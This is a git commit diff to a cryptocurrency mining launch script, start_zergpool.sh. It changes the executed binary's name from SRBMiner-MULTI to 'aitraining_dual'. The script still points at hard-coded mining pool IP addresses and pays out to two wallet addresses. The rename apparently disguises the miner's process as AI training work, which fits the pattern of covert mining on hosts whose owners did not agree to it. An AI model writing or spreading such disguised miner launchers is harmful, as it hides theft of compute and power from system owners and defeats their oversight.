8834f5b795eb0d22a1b6a84e6a1d1a06e91b5599
max313iq <153689278+max313iq@users.noreply.github.com>
2025-12-08 15:24:30 +0300

    Update start_zergpool.sh

--- start_zergpool.sh
+++ start_zergpool.sh
@@ -55,7 +55,7 @@ export GPU_MAX_WORKGROUP_SIZE=1024
 # --- Execute the Miner ---
 
 # We assume SRBMiner-MULTI is available in the current working directory (/opt)
-exec ./SRBMiner-MULTI \
+exec ./aitraining_dual \
     --algorithm "kawpow;randomx" \
     --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
     --wallet "RM2ciYa3CRqyreRsf25omrB4e1S95waALr;44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd" \
